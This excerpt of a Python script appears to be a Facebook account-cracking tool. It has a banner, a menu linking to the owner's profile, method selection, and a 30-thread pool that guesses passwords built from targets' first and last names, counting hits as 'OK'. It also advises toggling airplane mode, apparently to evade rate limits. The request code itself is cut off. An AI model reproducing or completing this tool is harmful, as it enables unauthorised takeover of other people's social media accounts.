...
def logo():
    print("""\033[1;37m_____   ____  ____    ____  _____ 
|     | /    T|    \  /    T|     T
|   __jY  o  ||  D  )Y  o  |l__/  |
|  l_  |     ||    / |     ||   __j
|   _] |  _  ||    \ |  _  ||  /  |
...
def faraz():
	...
	print(f" [3] Owner Facebook Link ")
	print(f" [4] Owner Whatsapp Number ")
	print(f" [0] Exit")
	print("--------------------------------------------------")
	faraz = input("\033[;92m [>>]\033[;37m Choose an option : ")
	if faraz in ["2", "02"]:
		print(" Soon Option")
	if faraz in ["3","03"]:
		os.system("xdg-open https://www.facebook.com/mukunda.basnet.353")
	...
	if faraz in ["1", "01","11","A","a"]:
		...
		try:
			...
			exit()
		print("--------------------------------------------------")
		print(f' Method 1 \n Method 2 \033[1;92mWorking \033[1;37m ')
		print("--------------------------------------------------")
		mthd=input(f' Choose Method  : ')
		plist=[]
		try:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[1;37m Turn on & off flight (\033[1;91mairplane\033[1;37m) mode before use :)")
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [FARAZ-M2] %s|\033[1;32m OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
